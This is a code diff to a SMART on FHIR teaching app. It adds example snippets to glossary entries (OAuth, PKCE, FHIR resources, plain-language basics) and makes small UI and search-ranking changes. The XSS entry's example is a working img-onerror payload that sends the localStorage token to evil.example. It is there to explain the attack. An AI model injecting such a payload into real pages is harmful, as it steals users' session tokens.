+      { term: "permission-v2", category: "SMART Capabilities", def: "Capability indicating support for SMART v2 granular scope syntax: patient/Observation.cruds where each letter grants a specific operation (c=create, r=read, u=update, d=delete, s=search).", example: "\"capabilities\": [ ..., \"permission-v2\", ... ]" },
+      { term: "sso-openid-connect", category: "SMART Capabilities", def: "Capability indicating the server supports SMART's OpenID Connect profile: it can issue an id_token (when the app asks for openid and fhirUser) that identifies the signed-in user. Whether the user skips a login screen is up to the EHR.", example: "\"capabilities\": [ ..., \"sso-openid-connect\", ... ]" },
       // ── Security ───────────────────────────────────────────────────────────
-      { term: "code_challenge_method", category: "Security", def: "Specifies the hashing algorithm for PKCE. SMART requires 'S256' (SHA-256) and forbids 'plain' (sending the raw verifier as the challenge): servers SHALL NOT support it." },
-      { term: "CSRF", category: "Security", def: "Cross-Site Request Forgery. An attack where a malicious site tricks an authenticated user's browser into making unwanted requests. The OAuth 'state' parameter prevents CSRF in authorization flows." },
-      { term: "refresh token rotation", category: "Security", def: "A security pattern where the server issues a new refresh_token with every refresh grant and immediately revokes the old one. If a stolen token is used by an attacker, the legitimate app's next refresh fails, detecting the breach." },
-      { term: "S256", category: "Security", def: "The PKCE code_challenge_method value meaning BASE64URL(SHA256(code_verifier)). SHA-256 is one-way, so anyone who sees the challenge in the sign-in URL cannot work out the verifier. The app reveals the verifier only to the token_endpoint, which hashes it and compares." },
-      { term: "XSS", category: "Security", def: "Cross-Site Scripting. An attack injecting malicious JavaScript into a web app. Such a script can read localStorage and sessionStorage alike, so keep tokens in memory (or let a backend hold them) and use a strict Content Security Policy." },
+      { term: "code_challenge_method", category: "Security", def: "Specifies the hashing algorithm for PKCE. SMART requires 'S256' (SHA-256) and forbids 'plain' (sending the raw verifier as the challenge): servers SHALL NOT support it.", example: "&code_challenge_method=S256" },
+      { term: "CSRF", category: "Security", def: "Cross-Site Request Forgery. An attack where a malicious site tricks an authenticated user's browser into making unwanted requests. The OAuth 'state' parameter prevents CSRF in authorization flows.", example: "sent:     &state=csrf_98a7b6c5\nreturned: ?code=...&state=csrf_attacker_val   (mismatch: stop)" },
+      { term: "refresh token rotation", category: "Security", def: "A security pattern where the server issues a new refresh_token with every refresh grant and immediately revokes the old one. If a stolen token is used by an attacker, the legitimate app's next refresh fails, detecting the breach.", example: "use rt_gen1  ->  server returns rt_gen2 and cancels rt_gen1\nreuse rt_gen1  ->  rejected, possible theft" },
+      { term: "S256", category: "Security", def: "The PKCE code_challenge_method value meaning BASE64URL(SHA256(code_verifier)). SHA-256 is one-way, so anyone who sees the challenge in the sign-in URL cannot work out the verifier. The app reveals the verifier only to the token_endpoint, which hashes it and compares.", example: "BASE64URL(SHA256(\"dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk\"))\n= E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM" },
+      { term: "XSS", category: "Security", def: "Cross-Site Scripting. An attack injecting malicious JavaScript into a web app. Such a script can read localStorage and sessionStorage alike, so keep tokens in memory (or let a backend hold them) and use a strict Content Security Policy.", example: "<img src=\"x\" onerror=\"fetch('https://evil.example/steal?t=' + localStorage.getItem('token'))\">" },
       // ── SMART Context & Discovery ──────────────────────────────────────────
-      { term: "/.well-known/smart-configuration", category: "Discovery", def: "The standard URL path appended to the FHIR base URL that returns the SMART Discovery document — a JSON object listing all OAuth endpoints, capabilities, and supported scopes for that server." },
-      { term: "CapabilityStatement", category: "Discovery", def: "A clinical metadata document at /metadata describing the FHIR server's supported resources, profiles, and search parameters. Separate from SMART Discovery — covers WHAT clinical data is available, not HOW to authorize." },
-      { term: "launch context", category: "Discovery", def: "Session-specific values returned in the token response after authorization. Includes 'patient' (FHIR Patient ID), optionally 'encounter', 'need_patient_banner', and 'smart_style_url'." },
-      { term: "need_patient_banner", category: "Discovery", def: "Token response boolean. true = standalone app must render its own patient header (name, DOB, MRN). false = EHR already shows the patient banner in its frame; app should not duplicate it." },
-      { term: "smart_style_url", category: "Discovery", def: "Token response URL pointing to a JSON object with EHR-specific CSS color variables. Allows an embedded SMART app to visually match the surrounding EHR's theme (fonts, colors, button styles)." },
+      { term: "/.well-known/smart-configuration", category: "Discovery", def: "The standard URL path appended to the FHIR base URL that returns the SMART Discovery document — a JSON object listing all OAuth endpoints, capabilities, and supported scopes for that server.", example: "GET https://api.mock.health/fhir/.well-known/smart-configuration" },
+      { term: "CapabilityStatement", category: "Discovery", def: "A clinical metadata document at /metadata describing the FHIR server's supported resources, profiles, and search parameters. Separate from SMART Discovery — covers WHAT clinical data is available, not HOW to authorize.", example: "GET https://api.mock.health/fhir/metadata" },
+      { term: "launch context", category: "Discovery", def: "Session-specific values returned in the token response after authorization. Includes 'patient' (FHIR Patient ID), optionally 'encounter', 'need_patient_banner', and 'smart_style_url'.", example: "{\n  \"access_token\": \"eyJhbGciOi...\",\n  \"patient\": \"pat-mother-eleanor-456\",\n  \"encounter\": \"enc-ed-triage-8821\"\n}" },
+      { term: "need_patient_banner", category: "Discovery", def: "Token response boolean. true = standalone app must render its own patient header (name, DOB, MRN). false = EHR already shows the patient banner in its frame; app should not duplicate it.", example: "\"need_patient_banner\": false" },
+      { term: "smart_style_url", category: "Discovery", def: "Token response URL pointing to a JSON object with EHR-specific CSS color variables. Allows an embedded SMART app to visually match the surrounding EHR's theme (fonts, colors, button styles).", example: "\"smart_style_url\": \"https://api.mock.health/style/ehr-theme.json\"" },
       // ── FHIR Resources ─────────────────────────────────────────────────────
-      { term: "Bundle", category: "FHIR Resources", def: "A FHIR container resource grouping multiple resources together. FHIR search results are returned as a Bundle of type 'searchset' with an array of 'entry' objects." },
-      { term: "Encounter", category: "FHIR Resources", def: "A FHIR resource representing a clinical interaction (e.g. an ED visit, outpatient appointment). Returned as 'encounter' context in EHR Launch token responses when an active encounter exists." },
-      { term: "Observation", category: "FHIR Resources", def: "A FHIR resource for a clinical measurement or finding. Lab results (HbA1c, CBC), vital signs (blood pressure, weight), and social history are all represented as Observation resources." },
-      { term: "Patient", category: "FHIR Resources", def: "A FHIR resource representing a person receiving healthcare. The Patient.id is returned as the 'patient' context value in the token response after SMART authorization." },
-      { term: "Practitioner", category: "FHIR Resources", def: "A FHIR resource representing a clinical professional (doctor, nurse, pharmacist). When a clinician launches an app via EHR Launch, the id_token's fhirUser claim often references a Practitioner resource." },
-      { term: "RelatedPerson", category: "FHIR Resources", def: "A FHIR resource representing a person related to a patient (caregiver, family member). When a caregiver accesses their family member's records, the id_token's fhirUser claim references a RelatedPerson." },
+      { term: "Bundle", category: "FHIR Resources", def: "A FHIR container resource grouping multiple resources together. FHIR search results are returned as a Bundle of type 'searchset' with an array of 'entry' objects.", example: "{\n  \"resourceType\": \"Bundle\",\n  \"type\": \"searchset\",\n  \"total\": 2,\n  \"entry\": [ ... ]\n}" },
+      { term: "Encounter", category: "FHIR Resources", def: "A FHIR resource representing a clinical interaction (e.g. an ED visit, outpatient appointment). Returned as 'encounter' context in EHR Launch token responses when an active encounter exists.", example: "\"encounter\": \"enc-ed-triage-8821\"" },
+      { term: "Observation", category: "FHIR Resources", def: "A FHIR resource for a clinical measurement or finding. Lab results (HbA1c, CBC), vital signs (blood pressure, weight), and social history are all represented as Observation resources.", example: "{\n  \"resourceType\": \"Observation\",\n  \"status\": \"final\",\n  \"code\": { \"coding\": [{ \"system\": \"http://loinc.org\", \"code\": \"4548-4\" }] },\n  \"valueQuantity\": { \"value\": 6.8, \"unit\": \"%\" }\n}" },
+      { term: "Patient", category: "FHIR Resources", def: "A FHIR resource representing a person receiving healthcare. The Patient.id is returned as the 'patient' context value in the token response after SMART authorization.", example: "{ \"resourceType\": \"Patient\", \"id\": \"pat-mother-eleanor-456\" }" },
+      { term: "Practitioner", category: "FHIR Resources", def: "A FHIR resource representing a clinical professional (doctor, nurse, pharmacist). When a clinician launches an app via EHR Launch, the id_token's fhirUser claim often references a Practitioner resource.", example: "\"fhirUser\": \"Practitioner/dr-smith-101\"" },
+      { term: "RelatedPerson", category: "FHIR Resources", def: "A FHIR resource representing a person related to a patient (caregiver, family member). When a caregiver accesses their family member's records, the id_token's fhirUser claim references a RelatedPerson.", example: "\"fhirUser\": \"RelatedPerson/john-42\"" },
       // ── Launch Workflows ───────────────────────────────────────────────────
-      { term: "authorization_code flow", category: "Launch Workflows", def: "The main OAuth 2.0 flow for user-facing SMART apps. App redirects browser to authorization_endpoint → user logs in → server redirects back with a one-time 'code' → app exchanges code at token_endpoint for tokens." },
-      { term: "EHR Launch", category: "Launch Workflows", def: "Launch workflow initiated from inside the EHR. The EHR opens the app's launch URL with ?iss= (FHIR base) and ?launch= (opaque context token). Patient/encounter context is established without additional user selection." },
-      { term: "Standalone Launch", category: "Launch Workflows", def: "Launch workflow where the app starts independently on a device or browser outside the EHR. The app requests launch/patient scope, causing the authorization server to present a patient-picker to the user." },
-      { term: "backend service", category: "Launch Workflows", def: "A server-to-server SMART workflow using client_credentials grant. No browser, no user sign-in. The backend app authenticates with a signed JWT (private_key_jwt) and receives a system-scoped access_token for bulk queries." },
+      { term: "authorization_code flow", category: "Launch Workflows", def: "The main OAuth 2.0 flow for user-facing SMART apps. App redirects browser to authorization_endpoint → user logs in → server redirects back with a one-time 'code' → app exchanges code at token_endpoint for tokens.", example: "https://app.example.org/callback?code=authz_code_9f8a7b6c5d4e&state=csrf_98a7b6c5" },
+      { term: "EHR Launch", category: "Launch Workflows", def: "Launch workflow initiated from inside the EHR. The EHR opens the app's launch URL with ?iss= (FHIR base) and ?launch= (opaque context token). Patient/encounter context is established without additional user selection.", example: "https://app.example.org/launch?iss=https%3A%2F%2Fapi.mock.health%2Ffhir&launch=xyz987" },
+      { term: "Standalone Launch", category: "Launch Workflows", def: "Launch workflow where the app starts independently on a device or browser outside the EHR. The app requests launch/patient scope, causing the authorization server to present a patient-picker to the user.", example: "scope=launch/patient openid fhirUser   (no launch= token)" },
+      { term: "backend service", category: "Launch Workflows", def: "A server-to-server SMART workflow using client_credentials grant. No browser, no user sign-in. The backend app authenticates with a signed JWT (private_key_jwt) and receives a system-scoped access_token for bulk queries.", example: "grant_type=client_credentials\n&scope=system/Observation.rs\n&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer\n&client_assertion=eyJhbGciOiJSUzM4NCIs..." },
       // ── Plain-Language Basics ──────────────────────────────────────────────
-      { term: "Sandbox", category: "Plain-Language Basics", def: "A practice copy of a system filled with fake patients, so developers and learners can test safely without touching real health records. Epic, Oracle Health and the SMART launcher all offer one." },
-      { term: "Synthetic data", category: "Plain-Language Basics", def: "Made-up patient records that look realistic but belong to no real person. Sandboxes use them so nobody's privacy is at risk." },
+      { term: "Sandbox", category: "Plain-Language Basics", def: "A practice copy of a system filled with fake patients, so developers and learners can test safely without touching real health records. Epic, Oracle Health and the SMART launcher all offer one.", example: "https://fhir.epic.com/interconnect-fhir-oauth/api/FHIR/R4   (Epic's sandbox)" },
+      { term: "Synthetic data", category: "Plain-Language Basics", def: "Made-up patient records that look realistic but belong to no real person. Sandboxes use them so nobody's privacy is at risk.", example: "{ \"resourceType\": \"Patient\", \"id\": \"example\", \"name\": [{ \"text\": \"Test Patient\" }] }" },
       { term: "Server", category: "Plain-Language Basics", def: "A computer that stores data or does work and answers requests sent over the internet. In this lab, the authorization server (sign-in and tokens) and the FHIR server (health records) are two different servers." },
-      { term: "Client", category: "Plain-Language Basics", def: "The program asking for something. In OAuth the client is the app, such as John's graphing app, not the person using it." },
-      { term: "Endpoint", category: "Plain-Language Basics", def: "A specific web address on a server that does one job, such as the authorization_endpoint (where the user signs in) or the token_endpoint (where the app collects its tokens)." },
-      { term: "Base URL", category: "Plain-Language Basics", def: "The starting web address of a FHIR server, such as https://api.mock.health/fhir. Other addresses are built by adding to the end of it, like /Observation or /.well-known/smart-configuration." },
-      { term: "Request and response", category: "Plain-Language Basics", def: "A request is a message an app sends to a server, such as 'give me Eleanor's lab results'. The response is the server's reply: a status code, and usually some data." },
-      { term: "Status code", category: "Plain-Language Basics", def: "The three-digit number at the start of every web response. 200 means success, 202 means accepted and still working, 302 means 'go to this other address', 400 means the request was malformed, 401 means not signed in or a bad token, 403 means not allowed." },
-      { term: "Header", category: "Plain-Language Basics", def: "Extra labelled information sent with a web request or response, separate from the main content. The access token travels in the Authorization header." },
-      { term: "Query string", category: "Plain-Language Basics", def: "The part of a web address after the question mark, made of name=value pairs joined by &. The sign-in request sends scope, state and code_challenge this way." },
-      { term: "Redirect", category: "Plain-Language Basics", def: "When a server tells the browser to go to a different address. A SMART sign-in uses redirects to send the user to the sign-in page and then back to the app." },
-      { term: "Callback URL", category: "Plain-Language Basics", def: "The app's own address that the authorization server sends the browser back to after sign-in, carrying a one-time code. Also called the redirect_uri. It must be registered in advance." },
-      { term: "JSON", category: "Plain-Language Basics", def: "JavaScript Object Notation. A plain-text format for data made of names and values inside curly braces, such as {\"status\": \"final\"}. FHIR resources and the SMART discovery file are written in JSON." },
-      { term: "NDJSON", category: "Plain-Language Basics", def: "Newline-delimited JSON: a file where every line is one complete JSON record. Bulk data export delivers FHIR resources this way." },
-      { term: "Authentication", category: "Plain-Language Basics", def: "Proving who you are, for example by signing in with a password. The id_token is the result of authentication." },
-      { term: "Authorization", category: "Plain-Language Basics", def: "Deciding what someone is allowed to do or see. Scopes and the access_token are about authorization." },
+      { term: "Client", category: "Plain-Language Basics", def: "The program asking for something. In OAuth the client is the app, such as John's graphing app, not the person using it.", example: "\"client_id\": \"john-graph-app\"" },
+      { term: "Endpoint", category: "Plain-Language Basics", def: "A specific web address on a server that does one job, such as the authorization_endpoint (where the user signs in) or the token_endpoint (where the app collects its tokens).", example: "https://api.mock.health/smart/token" },
+      { term: "Base URL", category: "Plain-Language Basics", def: "The starting web address of a FHIR server, such as https://api.mock.health/fhir. Other addresses are built by adding to the end of it, like /Observation or /.well-known/smart-configuration.", example: "https://api.mock.health/fhir" },
+      { term: "Request and response", category: "Plain-Language Basics", def: "A request is a message an app sends to a server, such as 'give me Eleanor's lab results'. The response is the server's reply: a status code, and usually some data.", example: "GET /fhir/Patient/pat-mother-eleanor-456\n\nHTTP/1.1 200 OK\nContent-Type: application/fhir+json" },
+      { term: "Status code", category: "Plain-Language Basics", def: "The three-digit number at the start of every web response. 200 means success, 202 means accepted and still working, 302 means 'go to this other address', 400 means the request was malformed, 401 means not signed in or a bad token, 403 means not allowed.", example: "HTTP/1.1 200 OK\nHTTP/1.1 401 Unauthorized" },
+      { term: "Header", category: "Plain-Language Basics", def: "Extra labelled information sent with a web request or response, separate from the main content. The access token travels in the Authorization header.", example: "Authorization: Bearer eyJhbGciOi...\nAccept: application/fhir+json" },
+      { term: "Query string", category: "Plain-Language Basics", def: "The part of a web address after the question mark, made of name=value pairs joined by &. The sign-in request sends scope, state and code_challenge this way.", example: "?patient=pat-mother-eleanor-456&category=laboratory" },
+      { term: "Redirect", category: "Plain-Language Basics", def: "When a server tells the browser to go to a different address. A SMART sign-in uses redirects to send the user to the sign-in page and then back to the app.", example: "HTTP/1.1 302 Found\nLocation: https://app.example.org/callback?code=authz_code_9f8a..." },
+      { term: "Callback URL", category: "Plain-Language Basics", def: "The app's own address that the authorization server sends the browser back to after sign-in, carrying a one-time code. Also called the redirect_uri. It must be registered in advance.", example: "https://app.example.org/callback" },
+      { term: "JSON", category: "Plain-Language Basics", def: "JavaScript Object Notation. A plain-text format for data made of names and values inside curly braces, such as {\"status\": \"final\"}. FHIR resources and the SMART discovery file are written in JSON.", example: "{ \"status\": \"final\", \"value\": 6.8 }" },
+      { term: "NDJSON", category: "Plain-Language Basics", def: "Newline-delimited JSON: a file where every line is one complete JSON record. Bulk data export delivers FHIR resources this way.", example: "{\"resourceType\": \"Patient\", \"id\": \"p1\"}\n{\"resourceType\": \"Patient\", \"id\": \"p2\"}" },
+      { term: "Authentication", category: "Plain-Language Basics", def: "Proving who you are, for example by signing in with a password. The id_token is the result of authentication.", example: "John signs in to the patient portal\n->  id_token: \"sub\": \"user-john-caregiver-42\"" },
+      { term: "Authorization", category: "Plain-Language Basics", def: "Deciding what someone is allowed to do or see. Scopes and the access_token are about authorization.", example: "\"scope\": \"launch/patient openid fhirUser patient/Observation.rs\"   (what was granted)" },
       { term: "Credential", category: "Plain-Language Basics", def: "Anything that proves identity or permission: a password, a client secret, a private key, or a token." },
-      { term: "Hash", category: "Plain-Language Basics", def: "A one-way scramble of data into a short, fixed-length fingerprint. The same input always gives the same hash, but the hash cannot be turned back into the input. PKCE relies on this." },
-      { term: "SHA-256", category: "Plain-Language Basics", def: "A widely used hash function that produces a 256-bit fingerprint. In PKCE, the code_challenge is the SHA-256 hash of the code_verifier." },
-      { term: "Base64URL", category: "Plain-Language Basics", def: "A way of writing computer data using only letters, digits, - and _, so it is safe inside a web address. PKCE challenges and the three parts of a JWT are written this way." },
-      { term: "Digital signature", category: "Plain-Language Basics", def: "A mathematical seal made with a private key. Anyone with the matching public key can check that the data came from the signer and was not changed. Servers sign id_tokens; backend apps sign their login assertions." },
-      { term: "Public and private keys", category: "Plain-Language Basics", def: "A matched pair of keys. The private key is kept secret and used to sign; the public key is shared openly (for example at a jwks_uri) and used to check those signatures." },
-      { term: "Client secret", category: "Plain-Language Basics", def: "A password issued to an app, not to a person, so the app can prove who it is at the token_endpoint. Only apps that can keep it hidden on their own server should use one." },
-      { term: "Confidential client", category: "Plain-Language Basics", def: "An app that runs on a server it controls, so it can keep a client secret or private key hidden. A public client (a phone app, or a web app running in the browser) cannot, so it relies on PKCE instead." },
-      { term: "Front channel and back channel", category: "Plain-Language Basics", def: "The front channel is messages carried through the user's browser by redirects, such as the sign-in request, which the user or malware could see. The back channel is direct calls from the app to a server, such as the POST to the token_endpoint." },
+      { term: "Hash", category: "Plain-Language Basics", def: "A one-way scramble of data into a short, fixed-length fingerprint. The same input always gives the same hash, but the hash cannot be turned back into the input. PKCE relies on this.", example: "SHA-256(\"hello\") = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824\nSHA-256(\"Hello\") = 185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969\n\nOne capital letter changes the whole fingerprint." },
+      { term: "SHA-256", category: "Plain-Language Basics", def: "A widely used hash function that produces a 256-bit fingerprint. In PKCE, the code_challenge is the SHA-256 hash of the code_verifier.", example: "SHA-256(\"hello\") = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824\n(always 64 characters, whatever the input length)" },
+      { term: "Base64URL", category: "Plain-Language Basics", def: "A way of writing computer data using only letters, digits, - and _, so it is safe inside a web address. PKCE challenges and the three parts of a JWT are written this way.", example: "\"Hi?\" written in Base64URL is  SGk_\n{\"alg\":\"RS256\"} becomes  eyJhbGciOiJSUzI1NiJ9" },
+      { term: "Digital signature", category: "Plain-Language Basics", def: "A mathematical seal made with a private key. Anyone with the matching public key can check that the data came from the signer and was not changed. Servers sign id_tokens; backend apps sign their login assertions.", example: "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyLTQyIn0.N8Ru9dlHN4ephBvY...\n                                        ^ the signature is this last part" },
+      { term: "Public and private keys", category: "Plain-Language Basics", def: "A matched pair of keys. The private key is kept secret and used to sign; the public key is shared openly (for example at a jwks_uri) and used to check those signatures.", example: "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...\n-----END PUBLIC KEY-----" },
+      { term: "Client secret", category: "Plain-Language Basics", def: "A password issued to an app, not to a person, so the app can prove who it is at the token_endpoint. Only apps that can keep it hidden on their own server should use one.", example: "Authorization: Basic am9obi1ncmFwaC1hcHA6c2VjcmV0\n(Base64 of  john-graph-app:secret)" },
+      { term: "Confidential client", category: "Plain-Language Basics", def: "An app that runs on a server it controls, so it can keep a client secret or private key hidden. A public client (a phone app, or a web app running in the browser) cannot, so it relies on PKCE instead.", example: "client_assertion=eyJhbGciOiJSUzM4NCIs...   (signed with a private key held on the app's server)" },
+      { term: "Front channel and back channel", category: "Plain-Language Basics", def: "The front channel is messages carried through the user's browser by redirects, such as the sign-in request, which the user or malware could see. The back channel is direct calls from the app to a server, such as the POST to the token_endpoint.", example: "front: 302 Location: https://app.example.org/callback?code=...\nback:  POST https://api.mock.health/smart/token" },
       { term: "Reverse proxy", category: "Plain-Language Basics", def: "A gateway server that sits in front of other servers and forwards requests to them, often handling encryption (TLS) and security checks. In Watch the Flow it is the yellow dot on a message." },
-      { term: "Discovery document", category: "Plain-Language Basics", def: "The public settings file a SMART server publishes at /.well-known/smart-configuration, listing its addresses and the features it supports. An app reads it before anything else." },
-      { term: "Capability", category: "Plain-Language Basics", def: "A feature a SMART server says it supports, listed in its discovery document, such as launch-ehr or permission-v2." },
-      { term: "Resource", category: "Plain-Language Basics", def: "One kind of health record in FHIR, such as Patient, Observation or Condition. Each resource type has a defined set of fields." },
-      { term: "Implementation guide", category: "Plain-Language Basics", def: "A published set of rules that narrows a broad standard for a specific use. US Core and SMART App Launch are both implementation guides for FHIR." },
-      { term: "Profile", category: "Plain-Language Basics", def: "The rules in an implementation guide for one resource type: which fields must be present and which codes to use. Example: the US Core Laboratory Result Observation profile." },
-      { term: "Code system", category: "Plain-Language Basics", def: "A standard list of codes with agreed meanings, such as LOINC for lab tests or SNOMED CT for diagnoses. Using codes instead of free text lets different systems understand each other." },
+      { term: "Discovery document", category: "Plain-Language Basics", def: "The public settings file a SMART server publishes at /.well-known/smart-configuration, listing its addresses and the features it supports. An app reads it before anything else.", example: "{\n  \"authorization_endpoint\": \"https://api.mock.health/smart/authorize\",\n  \"token_endpoint\": \"https://api.mock.health/smart/token\",\n  \"capabilities\": [\"launch-standalone\", \"permission-v2\"]\n}" },
+      { term: "Capability", category: "Plain-Language Basics", def: "A feature a SMART server says it supports, listed in its discovery document, such as launch-ehr or permission-v2.", example: "\"capabilities\": [\"launch-ehr\", \"launch-standalone\", \"permission-v2\"]" },
+      { term: "Resource", category: "Plain-Language Basics", def: "One kind of health record in FHIR, such as Patient, Observation or Condition. Each resource type has a defined set of fields.", example: "\"resourceType\": \"Observation\"" },
+      { term: "Implementation guide", category: "Plain-Language Basics", def: "A published set of rules that narrows a broad standard for a specific use. US Core and SMART App Launch are both implementation guides for FHIR.", example: "hl7.fhir.us.core#6.1.0   (US Core, version 6.1.0)" },
+      { term: "Profile", category: "Plain-Language Basics", def: "The rules in an implementation guide for one resource type: which fields must be present and which codes to use. Example: the US Core Laboratory Result Observation profile.", example: "\"meta\": { \"profile\": [\"http://hl7.org/fhir/us/core/StructureDefinition/us-core-observation-lab\"] }" },
+      { term: "Code system", category: "Plain-Language Basics", def: "A standard list of codes with agreed meanings, such as LOINC for lab tests or SNOMED CT for diagnoses. Using codes instead of free text lets different systems understand each other.", example: "{ \"system\": \"http://loinc.org\", \"code\": \"4548-4\" }" },
       { term: "Interoperability", category: "Plain-Language Basics", def: "Different systems being able to exchange data and use it without special effort. SMART on FHIR is one of the main tools for this in US healthcare." },
       { term: "ONC", category: "Plain-Language Basics", def: "The Office of the National Coordinator for Health Information Technology, part of the US Department of Health and Human Services (renamed ASTP/ONC in 2024). It runs the certification program that requires EHRs to support SMART on FHIR." },
       { term: "21st Century Cures Act", category: "Plain-Language Basics", def: "A 2016 US law that, among other things, required health records to be available through standard APIs 'without special effort' and made information blocking a violation." },
-      { term: "USCDI", category: "Plain-Language Basics", def: "United States Core Data for Interoperability: ONC's list of data elements, such as lab results, medications and allergies, that certified systems must be able to share." },
-      { term: "US Core", category: "Plain-Language Basics", def: "The HL7 implementation guide that defines how USCDI data is represented in FHIR, one profile per kind of data." },
+      { term: "USCDI", category: "Plain-Language Basics", def: "United States Core Data for Interoperability: ONC's list of data elements, such as lab results, medications and allergies, that certified systems must be able to share.", example: "Laboratory, Vital Signs, Medications, Allergies and Intolerances, Problems, ..." },
+      { term: "US Core", category: "Plain-Language Basics", def: "The HL7 implementation guide that defines how USCDI data is represented in FHIR, one profile per kind of data.", example: "US Core Laboratory Result Observation (a profile)" },
       { term: "Patient portal", category: "Plain-Language Basics", def: "A website or app where patients see their own records and message their care team. A Standalone Launch often signs the user in with their patient portal account." },
-      { term: "Caregiver access", category: "Plain-Language Basics", def: "Permission for one person, such as John, to see another person's records, such as his mother Eleanor's. The signed-in user (fhirUser) and the patient in context are then different people." },
-      { term: "Least privilege", category: "Plain-Language Basics", def: "Giving an app only the permissions it truly needs. John's graphing app should ask for .rs (read and search), not .cruds (which also allows creating, updating and deleting)." },
-      { term: "Consent screen", category: "Plain-Language Basics", def: "The page where the user reviews what an app is asking for and approves or denies it. What the user approves becomes the granted scopes." },
-      { term: "DevTools", category: "Plain-Language Basics", def: "The developer tools built into web browsers such as Chrome, Safari and Firefox. Their Network tab lists every request a page makes, which is how you watch a SMART launch happen." },
-      { term: "Replay attack", category: "Plain-Language Basics", def: "Reusing a captured message or token to repeat an action. One-time authorization codes, PKCE and refresh token rotation all help stop replays." },
-      { term: "Asynchronous request", category: "Plain-Language Basics", def: "A request the server accepts right away (202 Accepted) but finishes later, while the app checks back on a status address. Bulk data export works this way." },
+      { term: "Caregiver access", category: "Plain-Language Basics", def: "Permission for one person, such as John, to see another person's records, such as his mother Eleanor's. The signed-in user (fhirUser) and the patient in context are then different people.", example: "\"fhirUser\": \"RelatedPerson/john-42\"   (who signed in)\n\"patient\": \"pat-mother-eleanor-456\"   (whose records)" },
+      { term: "Least privilege", category: "Plain-Language Basics", def: "Giving an app only the permissions it truly needs. John's graphing app should ask for .rs (read and search), not .cruds (which also allows creating, updating and deleting).", example: "patient/Observation.rs   not   patient/*.cruds" },
+      { term: "Consent screen", category: "Plain-Language Basics", def: "The page where the user reviews what an app is asking for and approves or denies it. What the user approves becomes the granted scopes.", example: "John Graph App would like to:\n  [x] Read and search lab results (patient/Observation.rs)\n  [x] Know who you are (openid fhirUser)\n        [ Deny ]   [ Allow ]" },
+      { term: "DevTools", category: "Plain-Language Basics", def: "The developer tools built into web browsers such as Chrome, Safari and Firefox. Their Network tab lists every request a page makes, which is how you watch a SMART launch happen.", example: "Chrome: View > Developer > Developer Tools > Network" },
+      { term: "Replay attack", category: "Plain-Language Basics", def: "Reusing a captured message or token to repeat an action. One-time authorization codes, PKCE and refresh token rotation all help stop replays.", example: "attacker resends a stolen code:\nPOST /smart/token  code=authz_code_9f8a...  (already used)\n->  400 invalid_grant" },
+      { term: "Asynchronous request", category: "Plain-Language Basics", def: "A request the server accepts right away (202 Accepted) but finishes later, while the app checks back on a status address. Bulk data export works this way.", example: "HTTP/1.1 202 Accepted\nContent-Location: https://api.mock.health/bulkstatus/7c1f" },
     ];
 
     // FINAL ASSESSMENT QUIZ (10 QUESTIONS)
@@ -1745,6 +1757,23 @@
       </details>
     );
 
+    // Open on desktop, closed on phones (where it would push the content down).
+    const OpenOnDesktop = ({ summary, children }) => {
+      const ref = useRef(null);
+      useEffect(() => {
+        if (ref.current && window.matchMedia("(min-width: 1024px)").matches) ref.current.open = true;
+      }, []);
+      return (
+        <details ref={ref} className="disclosure rounded-xl border border-slate-700 px-4">
+          <summary className="flex items-center justify-between gap-3 py-2.5 cursor-pointer text-sm font-semibold text-slate-200">
+            {summary}
+            <ChevronDown className="disclosure-chevron w-4 h-4 text-slate-500 shrink-0" />
+          </summary>
+          <div className="pb-3">{children}</div>
+        </details>
+      );
+    };
+
     const TABS = [
       { id: "concepts", label: "Start Here" },
       { id: "walkthrough", label: "Guided Lab" },
@@ -1791,6 +1820,7 @@
       const [sandboxComparisonMode, setSandboxComparisonMode] = useState("hapi");
 
       // LAB STEPS (Tab 4 Capstone)
+      const [labOverview, setLabOverview] = usePersistentState("overview", true, (v) => typeof v === "boolean");
       const [currentStepIndex, setCurrentStepIndex] = usePersistentState("step", 0, (v) => Number.isInteger(v) && v >= 0 && v < LAB_STEPS.length);
       const [completedSteps, setCompletedSteps] = usePersistentState("done", [], Array.isArray);
       const [isPrettyPrint, setIsPrettyPrint] = useState(true);
@@ -2019,16 +2049,30 @@
         window.scrollTo({ top: 0, behavior: "smooth" });
       }, [activeTab]);
 
-      const goToStep = (idx) => setCurrentStepIndex(idx);
+      const goToStep = (idx) => {
+        setLabOverview(false);
+        setCurrentStepIndex(idx);
+      };
       const markStepDone = (stepId) =>
         setCompletedSteps((prev) => (prev.includes(stepId) ? prev : [...prev, stepId]));
       const handleNext = () => {
+        if (labOverview) {
+          setLabOverview(false);
+          window.scrollTo({ top: 0, behavior: "smooth" });
+          return;
+        }
         markStepDone(LAB_STEPS[currentStepIndex].id);
         if (currentStepIndex < LAB_STEPS.length - 1) {
           setCurrentStepIndex((prev) => prev + 1);
         }
       };
       const handlePrev = () => {
+        if (labOverview) return;
+        if (currentStepIndex === 0) {
+          setLabOverview(true);
+          window.scrollTo({ top: 0, behavior: "smooth" });
+          return;
+        }
         if (currentStepIndex > 0) {
           setCurrentStepIndex((prev) => prev - 1);
         }
@@ -2154,6 +2198,21 @@
           list = phrase.length || words.length === 1
             ? phrase
             : list.filter((t) => words.some((w) => matches(t, w)));
+          // Exact term first, then terms that start with or contain the
+          // search, then entries that only mention it in the definition.
+          const rank = (t) => {
+            const name = t.term.toLowerCase().replace(/[()]/g, " ").replace(/\s+/g, " ").trim();
+            if (name === q) return 0;
+            if (name.startsWith(q)) return 1;
+            if (name.includes(q)) return 2;
+            if (words.some((w) => name === w)) return 3;
+            if (words.some((w) => name.includes(w))) return 4;
+            return 5;
+          };
+          list = list
+            .map((t, i) => ({ t, i, r: rank(t) }))
+            .sort((a, b) => a.r - b.r || a.i - b.i)
+            .map((x) => x.t);
         }
         return list;
       }, [glossarySearch, glossaryCategory]);
@@ -2166,11 +2225,11 @@
